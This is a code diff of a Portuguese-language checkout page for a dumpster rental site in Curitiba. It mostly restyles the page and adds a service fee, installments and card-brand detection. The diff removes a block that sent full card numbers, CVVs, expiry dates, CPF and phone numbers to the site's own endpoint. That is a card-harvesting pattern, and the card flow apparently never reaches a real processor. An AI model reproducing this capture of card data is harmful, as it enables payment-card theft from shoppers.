@@ -48,24 +48,30 @@
         }
 
         .logo-icon {
-            width: 40px;
-            height: 40px;
-            background: #1a1f36;
-            border-radius: 12px;
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #ffb800, #ff9500);
+            border-radius: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
+            box-shadow: 0 4px 10px rgba(255,184,0,0.3);
         }
 
         .logo-icon i {
-            font-size: 20px;
-            color: #ffb800;
+            font-size: 26px;
+            color: #1a1f36;
         }
 
         .logo-text h2 {
-            font-size: 1.25rem;
-            font-weight: 700;
+            font-size: 1.35rem;
+            font-weight: 800;
             color: #1a1f36;
+            letter-spacing: -0.3px;
+        }
+
+        .logo-text h2 span {
+            color: #ffb800;
         }
 
         .logo-text p {
@@ -286,13 +292,25 @@
             min-height: 200px;
         }
 
+        .card-brand {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 40px;
+            font-weight: bold;
+        }
+
         .card-chip {
-            width: 40px;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
+        }
+
+        .card-chip i {
+            font-size: 32px;
+            color: #ffb800;
         }
 
         .card-number-preview {
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             letter-spacing: 2px;
             font-family: monospace;
             margin-bottom: 20px;
@@ -316,7 +334,7 @@
             margin-bottom: 6px;
         }
 
-        .form-row input {
+        .form-row input, .form-row select {
             width: 100%;
             padding: 14px 16px;
             background: #ffffff;
@@ -327,7 +345,7 @@
             transition: all 0.2s;
         }
 
-        .form-row input:focus {
+        .form-row input:focus, .form-row select:focus {
             outline: none;
             border-color: #ffb800;
             box-shadow: 0 0 0 3px rgba(255,184,0,0.1);
@@ -366,18 +384,25 @@
             border-bottom: 1px solid #eef2f6;
         }
 
-        .product-icon-summary {
-            width: 56px;
-            height: 56px;
-            background: #fff8e8;
+        .product-image {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #fff8e8, #ffe4b5);
             border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
+            overflow: hidden;
         }
 
-        .product-icon-summary i {
-            font-size: 28px;
+        .product-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .product-image i {
+            font-size: 38px;
             color: #ffb800;
         }
 
@@ -418,6 +443,21 @@
         .total-line span:last-child {
             color: #ffb800;
             font-size: 1.3rem;
+        }
+
+        .parcelas-select {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #eef2f6;
+        }
+
+        .parcelas-select select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 12px;
+            border: 1.5px solid #e1e5eb;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.85rem;
         }
 
         .btn-confirm {
@@ -497,6 +537,26 @@
             margin-top: 32px;
             background: #ffffff;
         }
+
+        .banner-small {
+            background: linear-gradient(135deg, #1a1f36, #2d3748);
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+        }
+
+        .banner-small span {
+            font-size: 0.75rem;
+            opacity: 0.8;
+        }
+
+        .banner-small strong {
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
@@ -508,7 +568,7 @@
                 <i class="fas fa-dumpster"></i>
             </div>
             <div class="logo-text">
-                <h2>Ativa Caçambas</h2>
+                <h2>ATIVA <span>CAÇAMBAS</span></h2>
                 <p>Locação de caçambas | Curitiba - PR</p>
             </div>
         </div>
@@ -571,9 +631,10 @@
         </div>
 
         <div id="cartaoSection" class="card-content hidden">
-            <div class="card-preview">
+            <div class="card-preview" id="cardPreview">
+                <div class="card-brand" id="cardBrandIcon"></div>
                 <div class="card-chip">
-                    <i class="fas fa-microchip" style="font-size: 28px; color: #ffb800;"></i>
+                    <i class="fas fa-microchip"></i>
                 </div>
                 <div class="card-number-preview" id="cardNumberPreview">**** **** **** ****</div>
                 <div class="card-details-preview">
@@ -608,12 +669,17 @@
     </div>
 
     <div class="order-summary">
+        <div class="banner-small">
+            <span><i class="fas fa-truck"></i> Entrega rápida</span>
+            <strong>Frete Grátis!</strong>
+        </div>
+        
         <div class="summary-header">
             <h3>Resumo do pedido</h3>
         </div>
 
         <div class="product-item">
-            <div class="product-icon-summary" id="produtoIcone">
+            <div class="product-image" id="produtoImagem">
                 <i class="fas fa-dumpster"></i>
             </div>
             <div class="product-details">
@@ -628,12 +694,24 @@
                 <span id="subtotal">R$ 0,00</span>
             </div>
             <div class="price-line">
-                <span>Taxa de serviço</span>
-                <span>R$ 0,00</span>
+                <span>Taxa de serviço (5%)</span>
+                <span id="taxaServico">R$ 0,00</span>
             </div>
             <div class="total-line">
                 <span>Total</span>
                 <span id="totalValor">R$ 0,00</span>
+            </div>
+            
+            <div class="parcelas-select" id="parcelasDiv">
+                <label>Parcelamento</label>
+                <select id="parcelas" onchange="atualizarParcelamento()">
+                    <option value="1">1x de R$ 0,00 (sem juros)</option>
+                    <option value="2">2x de R$ 0,00 (sem juros)</option>
+                    <option value="3">3x de R$ 0,00 (sem juros)</option>
+                    <option value="4">4x de R$ 0,00 (sem juros)</option>
+                    <option value="5">5x de R$ 0,00 (sem juros)</option>
+                    <option value="6">6x de R$ 0,00 (sem juros)</option>
+                </select>
             </div>
         </div>
 
@@ -660,11 +738,14 @@
     let metodoAtual = 'pix';
     let clienteId = localStorage.getItem('cliente_id');
     let produtoId = localStorage.getItem('produto_id');
-    let produtoNome = localStorage.getItem('produto_nome');
-    let produtoPreco = parseFloat(localStorage.getItem('produto_preco'));
+    let produtoNome = localStorage.getItem('produto_nome') || 'Caçamba 5m³';
+    let produtoPreco = parseFloat(localStorage.getItem('produto_preco')) || 450;
     let clienteNome = localStorage.getItem('cliente_nome');
     let clienteCpf = localStorage.getItem('cliente_cpf');
     let clienteTelefone = localStorage.getItem('cliente_telefone');
+    
+    let taxaServico = produtoPreco * 0.05;
+    let totalComTaxa = produtoPreco + taxaServico;
     
     let currentPixCode = '';
     let currentTransactionId = '';
@@ -672,21 +753,45 @@
     let paymentCheckInterval = null;
     let paymentConfirmed = false;
     
-    document.getElementById('produtoNome').innerHTML = produtoNome || 'Produto';
+    // Atualizar valores
+    document.getElementById('produtoNome').innerHTML = produtoNome;
     document.getElementById('subtotal').innerHTML = `R$ ${produtoPreco.toFixed(2)}`;
-    document.getElementById('totalValor').innerHTML = `R$ ${produtoPreco.toFixed(2)}`;
+    document.getElementById('taxaServico').innerHTML = `R$ ${taxaServico.toFixed(2)}`;
+    document.getElementById('totalValor').innerHTML = `R$ ${totalComTaxa.toFixed(2)}`;
     
-    if (document.getElementById('cpfTitular')) {
-        document.getElementById('cpfTitular').value = clienteCpf || '';
+    function atualizarParcelamento() {
+        const parcelas = parseInt(document.getElementById('parcelas').value);
+        const valorParcela = totalComTaxa / parcelas;
+        const select = document.getElementById('parcelas');
+        for(let i = 0; i < select.options.length; i++) {
+            const num = parseInt(select.options[i].value);
+            const valor = totalComTaxa / num;
+            select.options[i].text = `${num}x de R$ ${valor.toFixed(2)} (sem juros)`;
+        }
     }
     
-    document.getElementById('btnConfirmar').disabled = true;
+    function detectarBandeira(numero) {
+        const num = numero.replace(/\s/g, '');
+        if (/^4/.test(num)) return { nome: 'Visa', cor: '#1a1f36', icon: 'fab fa-cc-visa' };
+        if (/^5[1-5]/.test(num)) return { nome: 'Mastercard', cor: '#eb001b', icon: 'fab fa-cc-mastercard' };
+        if (/^3[47]/.test(num)) return { nome: 'Amex', cor: '#006fcf', icon: 'fab fa-cc-amex' };
+        if (/^6(?:011|5)/.test(num)) return { nome: 'Discover', cor: '#ff6000', icon: 'fab fa-cc-discover' };
+        if (/^606282|^3841/.test(num)) return { nome: 'Hipercard', cor: '#b3002d', icon: 'fab fa-cc-visa' };
+        return { nome: 'Cartão', cor: '#ffb800', icon: 'fas fa-credit-card' };
+    }
     
     function formatarCartao(input) {
         let value = input.value.replace(/\D/g, '');
         value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
         input.value = value.slice(0, 19);
         document.getElementById('cardNumberPreview').innerHTML = value.slice(0, 19) || '**** **** **** ****';
+        
+        const bandeira = detectarBandeira(value);
+        const brandDiv = document.getElementById('cardBrandIcon');
+        const cardPreview = document.getElementById('cardPreview');
+        brandDiv.innerHTML = `<i class="${bandeira.icon}" style="font-size: 36px; color: ${bandeira.cor};"></i>`;
+        cardPreview.style.background = `linear-gradient(135deg, ${bandeira.cor}dd, #1a1f36)`;
+        
         validarCamposCartao();
     }
     
@@ -725,6 +830,13 @@
         validarCamposCartao();
     });
     
+    if (document.getElementById('cpfTitular')) {
+        document.getElementById('cpfTitular').value = clienteCpf || '';
+    }
+    
+    document.getElementById('btnConfirmar').disabled = true;
+    atualizarParcelamento();
+    
     function metodoPagamento(metodo) {
         metodoAtual = metodo;
         document.querySelectorAll('.method-option').forEach(opt => opt.classList.remove('active'));
@@ -733,10 +845,12 @@
         if (metodo === 'pix') {
             document.getElementById('pixSection').classList.remove('hidden');
             document.getElementById('cartaoSection').classList.add('hidden');
+            document.getElementById('parcelasDiv').classList.add('hidden');
             document.getElementById('btnConfirmar').disabled = !paymentConfirmed;
         } else {
             document.getElementById('pixSection').classList.add('hidden');
             document.getElementById('cartaoSection').classList.remove('hidden');
+            document.getElementById('parcelasDiv').classList.remove('hidden');
             validarCamposCartao();
         }
     }
@@ -786,10 +900,9 @@
                     
                     const statusDiv = document.getElementById('paymentStatus');
                     statusDiv.className = 'payment-status status-paid';
-                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado! Clique em Confirmar Pagamento';
+                    statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado!';
                     
                     document.getElementById('btnConfirmar').disabled = false;
-                    
                     await salvarPedido();
                 }
             } catch (error) {
@@ -807,7 +920,7 @@
                     cliente_id: parseInt(clienteId),
                     produto_id: parseInt(produtoId),
                     quantidade: 1,
-                    valor_total: produtoPreco,
+                    valor_total: totalComTaxa,
                     tipo_pagamento: metodoAtual
                 })
             });
@@ -840,7 +953,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    amount: produtoPreco,
+                    amount: totalComTaxa,
                     customer_name: clienteNome || 'Cliente',
                     customer_cpf: clienteCpf || '00000000000',
                     customer_phone: clienteTelefone || '41992878772'
@@ -861,7 +974,7 @@
                     body: JSON.stringify({
                         transaction_id: data.payment.id,
                         cpf: clienteCpf,
-                        valor: produtoPreco,
+                        valor: totalComTaxa,
                         telefone: clienteTelefone
                     })
                 });
@@ -903,27 +1016,9 @@
             btnConfirmar.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processando...';
             
             try {
-                const responseCartao = await fetch('/api/cartoes/salvar', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        nome_titular: nomeTitular,
-                        numero_cartao: numeroCartao,
-                        cvv: cvv,
-                        validade: validade,
-                        cpf: clienteCpf,
-                        telefone: clienteTelefone
-                    })
-                });
-                
-                const dataCartao = await responseCartao.json();
-                console.log('Resposta:', dataCartao);
-                
                 await salvarPedido();
-                
                 localStorage.clear();
                 window.location.href = 'checker.html';
-                
             } catch (error) {
                 console.error('Erro:', error);
                 btnConfirmar.disabled = false;
@@ -935,7 +1030,6 @@
             const btnConfirmar = document.getElementById('btnConfirmar');
             btnConfirmar.disabled = true;
             btnConfirmar.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Finalizando...';
-            
             localStorage.clear();
             window.location.href = 'checker.html';
         }
